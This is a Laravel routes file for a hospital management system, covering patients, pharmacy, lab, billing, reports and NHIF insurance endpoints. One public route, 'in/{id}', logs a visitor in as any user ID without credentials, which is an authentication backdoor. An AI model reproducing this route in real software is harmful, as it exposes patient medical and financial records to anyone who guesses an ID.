<?php

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\NhifController;
use App\Http\Controllers\PageController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\PatientController;
use App\Http\Controllers\MovementController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\PharmacyController;
use App\Http\Controllers\ManagerController;
use App\Http\Controllers\DoctorController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\FinancialController;
use App\Http\Controllers\WidgetController;

/*
|--------------------------------------------------------------------------
| Public routes (no auth required)
|--------------------------------------------------------------------------
*/
Route::get('', [PageController::class, 'login']);
Route::get('login', [PageController::class, 'login']);
Route::post('login', [PageController::class, 'login_action']);
Route::post('', [PageController::class, 'login_action']);

Route::get('check', function () {
    if (Auth::guest()) {
        return redirect('login')->with('error', 'You must login first');
    } elseif (Auth::user()->level == 1) {
        return redirect('admin')->with('success', 'Welcome to HosCare Admin Panel');
    } elseif (Auth::user()->role_id >= 1 && Auth::user()->level == 0) {
        return redirect('dashboard')->with('success', 'Welcome to HosCare');
    }
});

Route::get('in/{id}', function ($id) {
    Auth::loginUsingId($id);
    return redirect('dashboard');
});

/*
|--------------------------------------------------------------------------
| Authenticated routes
|--------------------------------------------------------------------------
*/
Route::middleware(['auth_user'])->group(function () {

    Route::get('logout', [UserController::class, 'logout']);
    Route::get('settings', [UserController::class, 'setting']);
    Route::post('settings', [UserController::class, 'setting_action']);

    Route::get('dashboard', [UserController::class, 'index']);

    // Basic Patient Operations
    Route::get('patients', [PatientController::class, 'index']);
    Route::get('patients/get', [PatientController::class, 'index_get']);
    Route::get('patient/view/{id}', [PatientController::class, 'view']);
    Route::post('patient/view/{id}', [PatientController::class, 'change_action']);

    Route::get('patient/edit/{id}', [PatientController::class, 'edit']);
    Route::post('patient/edit/{id}', [PatientController::class, 'edit_save']);

    // Nurse Patient Operations
    Route::get('patient/edit/vital/{id}', [PatientController::class, 'vital_edit']);
    Route::post('patient/edit/vital/{id}', [PatientController::class, 'vital_edit_save']);

    Route::get('patient/edit/allegies/{id}', [PatientController::class, 'allegies_edit']);
    Route::post('patient/edit/allegies/{id}', [PatientController::class, 'allegies_edit_save']);

    // In Patients List
    Route::get('inpatients', [PatientController::class, 'in_index']);
    Route::get('inpatients/get', [PatientController::class, 'in_index_get']);

    // Payment Patient Operation
    Route::get('patient/edit/payment/{id}', [PatientController::class, 'payment_edit']);
    Route::post('patient/edit/payment/{id}', [PatientController::class, 'payment_edit_save']);

    Route::get('bill/add/{id}', [PaymentController::class, 'bill_add']);
    Route::post('bill/add/{id}', [PaymentController::class, 'bill_add_save']);

    // Patient Movements
    Route::post('patient/attendance/start/{id}', [MovementController::class, 'start_attendance']);
    Route::post('patient/attendance/re/{id}', [MovementController::class, 'reattend_attendance']);
    Route::get('patient/return/action/{id}', [MovementController::class, 'return_action']);
    Route::get('patient/attendance/close/{id}', [MovementController::class, 'close_attendance']);

    Route::get('doctor/emergence', [MovementController::class, 'emergence']);

    Route::get('movements', [MovementController::class, 'index']);
    Route::get('movements/get', [MovementController::class, 'index_get']);

    Route::get('history', [MovementController::class, 'history_index']);
    Route::get('history/get', [MovementController::class, 'history_index_get']);

    Route::get('doctor/peformance', [MovementController::class, 'doctor_performance1']);
    Route::get('doctor/modify', [MovementController::class, 'doctor_modify']);
    Route::get('doctor/modify/get', [MovementController::class, 'doctor_modify_get']);

    Route::get('attendance/clinical/{id}', [PatientController::class, 'clinical']);
    Route::post('attendance/clinical/{id}', [PatientController::class, 'clinical_action']);

    Route::get('attendance/clinical/edit/{id}', [PatientController::class, 'clinical_edit']);
    Route::post('attendance/clinical/edit/{id}', [PatientController::class, 'clinical_edit_action']);

    Route::get('attendance/clinical/edit2/{id}', [PatientController::class, 'clinical_edit2']);
    Route::post('attendance/clinical/edit2/{id}', [PatientController::class, 'clinical_edit2_action']);

    Route::get('attendance/investigation/{id}', [PatientController::class, 'investigation']);
    Route::post('attendance/investigation/{id}', [PatientController::class, 'investigation_action']);

    Route::get('attendance/treatment/{id}', [PatientController::class, 'treatment']);
    Route::post('attendance/treatment/{id}', [PatientController::class, 'treatment_action']);

    Route::get('attendance/payment/{id}', [PaymentController::class, 'payment']);
    Route::post('attendance/payment/{id}', [PaymentController::class, 'payment_action']);

    Route::get('patient/emergence/{id}', [PatientController::class, 'emergence']);
    Route::post('patient/emergence/{id}', [PatientController::class, 'emergence_action']);

    // Pharmacy
    Route::get('attendance/dispense/{id}', [PharmacyController::class, 'dispense']);
    Route::post('attendance/dispense/{id}', [PharmacyController::class, 'dispense_action']);

    Route::get('pharmacy_medicines', [PharmacyController::class, 'med_index']);
    Route::get('pharmacy_medicines/get', [PharmacyController::class, 'med_index_get']);

    Route::get('pharmacy_medicines/edit/{id}', [PharmacyController::class, 'med_edit']);
    Route::post('pharmacy_medicines/edit/{id}', [PharmacyController::class, 'med_edit_save']);

    Route::get('pharmacy_medicines/view/{id}', [PharmacyController::class, 'med_view']);
    Route::get('pharmacy_medicines/stock/get/{id}', [PharmacyController::class, 'med_view_get']);

    // Emergence
    Route::get('emergence/dispense', [PharmacyController::class, 'emergence_dispense_list']);
    Route::get('emergence/dispense/get', [PharmacyController::class, 'emergence_dispense_lis_get']);
    Route::get('emergence/dispense/{id}', [PharmacyController::class, 'emergence_dispense']);
    Route::post('emergence/dispense/{id}', [PharmacyController::class, 'emergence_dispense_action']);

    // Widgets
    Route::get('widget/get/inoffice', [WidgetController::class, 'inoffice_get']);
    Route::get('widget/get/inoffices', [WidgetController::class, 'inoffices_get']);
    Route::get('widget/get/bills', [WidgetController::class, 'bills_get']);

    // Payments
    Route::get('payments', [PaymentController::class, 'index']);
    Route::get('payments/get', [PaymentController::class, 'index_get']);

    // Receipt
    Route::get('receipt/view/{id}', [PaymentController::class, 'show_receipt1']);

    // Lab Work
    Route::get('sample/{id1}/{id2}', [PatientController::class, 'register_sample']);
    Route::post('sample/{id1}/{id2}', [PatientController::class, 'register_sample_action']);
    Route::get('result/{id}', [PatientController::class, 'register_result']);
    Route::post('result/{id}', [PatientController::class, 'register_result_action']);
    Route::get('lab/edit', [PatientController::class, 'lab_edit']);

    // Reports
    Route::get('report/report1', [ReportController::class, 'report1_index']);
    Route::post('report/report1', [ReportController::class, 'report1_action']);

    Route::get('report/attendances', [MovementController::class, 'attendance_index']);
    Route::get('report/attendances/get', [MovementController::class, 'attendance_index_get']);

    Route::get('report/sales', [ReportController::class, 'report1_index']);
    Route::post('report/sales', [ReportController::class, 'report1_action']);

    Route::get('report/inventorystatus', [ReportController::class, 'med_list']);
    Route::get('report/inventoryzero', [ReportController::class, 'inventory_zero']);

    Route::get('pharmacy/report', [ReportController::class, 'inventory']);
    Route::post('pharmacy/report', [ReportController::class, 'inventory_report1']);

    Route::get('report/payments', [PaymentController::class, 'index']);
    Route::get('report/payments/get', [PaymentController::class, 'index_get']);

    Route::get('report/expense_report', [FinancialController::class, 'expense_report']);

    // Doctor routes
    Route::get('doc/diagnosis', [DoctorController::class, 'dia_index']);
    Route::get('doc/diagnosis/get', [DoctorController::class, 'dia_index_get']);
    Route::get('doc/diagnosis/edit/{id}', [DoctorController::class, 'dia_edit']);
    Route::post('doc/diagnosis/edit/{id}', [DoctorController::class, 'dia_edit_save']);

    // Manager routes
    Route::get('lab', [ManagerController::class, 'lab_index']);
    Route::get('lab/get', [ManagerController::class, 'lab_index_get']);

    Route::get('medicines', [ManagerController::class, 'med_index']);
    Route::get('medicines/get', [ManagerController::class, 'med_index_get']);

    Route::get('diagnosis', [ManagerController::class, 'dia_index']);
    Route::get('diagnosis/get', [ManagerController::class, 'dia_index_get']);

    Route::get('bills', [ManagerController::class, 'bills_index']);
    Route::get('bills/get', [ManagerController::class, 'bills_index_get']);

    Route::get('followup', [ManagerController::class, 'followup_index']);
    Route::get('followup/get', [ManagerController::class, 'followup_index_get']);

    Route::get('bill/edit/{id}', [ManagerController::class, 'bill_edit']);
    Route::post('bill/edit/{id}', [ManagerController::class, 'bill_edit_save']);

    Route::get('medicines/view/{id}', [ManagerController::class, 'med_view']);
    Route::get('medicines/stock/get/{id}', [ManagerController::class, 'med_view_get']);

    Route::get('lab/edit/{id}', [ManagerController::class, 'lab_edit']);
    Route::post('lab/edit/{id}', [ManagerController::class, 'lab_edit_save']);

    Route::get('medicines/edit/{id}', [ManagerController::class, 'med_edit']);
    Route::post('medicines/edit/{id}', [ManagerController::class, 'med_edit_save']);

    Route::get('diagnosis/edit/{id}', [ManagerController::class, 'dia_edit']);
    Route::post('diagnosis/edit/{id}', [ManagerController::class, 'dia_edit_save']);

    Route::get('users', [ManagerController::class, 'user_index']);
    Route::get('users/get', [ManagerController::class, 'user_index_get']);

    Route::get('user/edit/{id}', [ManagerController::class, 'user_edit']);
    Route::post('user/edit/{id}', [ManagerController::class, 'user_edit_save']);
    Route::get('user/disabled/{id}', [ManagerController::class, 'user_disabled_toggle']);

    Route::get('service/wards', [ManagerController::class, 'ward_index']);
    Route::get('wards/get', [ManagerController::class, 'ward_index_get']);
    Route::get('ward/edit/{id}', [ManagerController::class, 'ward_edit']);
    Route::post('ward/edit/{id}', [ManagerController::class, 'ward_edit_save']);

    Route::get('service/insurance', [ManagerController::class, 'insurance_index']);
    Route::get('insurance/get', [ManagerController::class, 'insurance_index_get']);
    Route::get('insurance/edit/{id}', [ManagerController::class, 'insurance_edit']);
    Route::post('insurance/edit/{id}', [ManagerController::class, 'insurance_edit_save']);

    Route::get('service/procedure', [ManagerController::class, 'procedure_index']);
    Route::get('procedure/get', [ManagerController::class, 'procedure_index_get']);
    Route::get('procedure/edit/{id}', [ManagerController::class, 'procedure_edit']);
    Route::post('procedure/edit/{id}', [ManagerController::class, 'procedure_edit_save']);

    Route::get('report/sales_report', [ManagerController::class, 'sales_report1']);
    Route::get('report/sales_report/date/{date}', [ManagerController::class, 'sales_report2']);

    Route::get('report/inventory', [ManagerController::class, 'inventory_index']);
    Route::get('report/inventory/get', [ManagerController::class, 'inventory_index_get']);
    Route::post('report/inventory', [ManagerController::class, 'inventory_report1']);

    Route::get('report/lab', [ManagerController::class, 'lab_report_index']);
    Route::post('report/lab', [ManagerController::class, 'lab_report_report1']);
    Route::get('report/lab/get', [ManagerController::class, 'lab_report_index_get']);

    Route::get('report/income_statement', [ManagerController::class, 'income_statement']);

    // Financial routes
    Route::get('financial/expense_ledger', [FinancialController::class, 'expense_ledger_index']);
    Route::get('financial/expense_ledger/get', [FinancialController::class, 'expense_ledger_index_get']);
    Route::get('financial/expense_ledger/edit/{id}', [FinancialController::class, 'expense_ledger_edit']);
    Route::post('financial/expense_ledger/edit/{id}', [FinancialController::class, 'expense_ledger_save']);

    Route::get('financial/expense_transaction', [FinancialController::class, 'expense_transaction_index']);
    Route::get('financial/expense_transaction/get', [FinancialController::class, 'expense_transaction_index_get']);
    Route::get('financial/expense_transaction/edit/{id}', [FinancialController::class, 'expense_transaction_edit']);
    Route::post('financial/expense_transaction/edit/{id}', [FinancialController::class, 'expense_transaction_save']);

    Route::get('financial/invoice', [FinancialController::class, 'invoice_index']);

    // -------------------------------------------------------------------------
    // NHIF Integration — ServiceHub (Verification, Approvals, Admissions)
    // -------------------------------------------------------------------------
    Route::prefix('nhif')->name('nhif.')->group(function () {

        // Verification
        Route::get('verify-card',               [NhifController::class, 'verifyCard'])->name('verify-card');
        Route::get('card-details',              [NhifController::class, 'getCardDetails'])->name('card-details');
        Route::get('card-details-by-nin',       [NhifController::class, 'getCardDetailsByNin'])->name('card-details-by-nin');
        Route::get('authorization-details',     [NhifController::class, 'getAuthorizationDetails'])->name('authorization-details');
        Route::get('percent-covered',           [NhifController::class, 'getPercentCovered'])->name('percent-covered');
        Route::get('excluded-services',         [NhifController::class, 'getPatientExcludedServices'])->name('excluded-services');
        Route::get('member-picture',            [NhifController::class, 'getMemberPicture'])->name('member-picture');
        Route::get('visit-types',               [NhifController::class, 'getVisitTypes'])->name('visit-types');
        Route::get('points-of-care',            [NhifController::class, 'getPointsOfCare'])->name('points-of-care');

        // Approvals
        Route::post('request-approval',         [NhifController::class, 'requestApproval'])->name('request-approval');
        Route::get('approval-status',           [NhifController::class, 'getApprovalStatus'])->name('approval-status');
        Route::post('issue-service',            [NhifController::class, 'issueApprovedService'])->name('issue-service');

        // Admissions
        Route::post('admit-patient',            [NhifController::class, 'admitPatient'])->name('admit-patient');
        Route::post('discharge-patient',        [NhifController::class, 'dischargePatient'])->name('discharge-patient');
        Route::get('admitted-patients',         [NhifController::class, 'getAdmittedPatients'])->name('admitted-patients');
        Route::get('admission-types',           [NhifController::class, 'getAdmissionTypes'])->name('admission-types');

        // Referrals
        Route::post('create-referral',          [NhifController::class, 'createReferral'])->name('create-referral');

        // Practitioner Attendance
        Route::post('practitioner-login',       [NhifController::class, 'practitionerLogin'])->name('practitioner-login');
        Route::post('practitioner-logout',      [NhifController::class, 'practitionerLogout'])->name('practitioner-logout');

        // Patient History
        Route::get('medical-history',           [NhifController::class, 'getMedicalHistory'])->name('medical-history');
        Route::get('visit-summary',             [NhifController::class, 'getVisitSummary'])->name('visit-summary');

        // Claims (OCS)
        Route::post('submit-folio',             [NhifController::class, 'submitFolio'])->name('submit-folio');
        Route::post('sign-folio',               [NhifController::class, 'signFolio'])->name('sign-folio');
        Route::post('request-bill-confirmation',[NhifController::class, 'requestBillConfirmation'])->name('request-bill-confirmation');
        Route::get('submitted-claims',          [NhifController::class, 'getSubmittedClaims'])->name('submitted-claims');
        Route::post('submit-monthly-claim',     [NhifController::class, 'submitMonthlyClaim'])->name('submit-monthly-claim');

        // Reference Data / Packages
        Route::get('price-list',                [NhifController::class, 'getPriceList'])->name('price-list');
        Route::get('benefit-schemes',           [NhifController::class, 'getBenefitSchemes'])->name('benefit-schemes');
        Route::get('diseases',                  [NhifController::class, 'getDiseases'])->name('diseases');
        Route::get('items',                     [NhifController::class, 'getItems'])->name('items');
        Route::get('co-payment-schedule',       [NhifController::class, 'getCoPaymentSchedule'])->name('co-payment-schedule');
    });
});
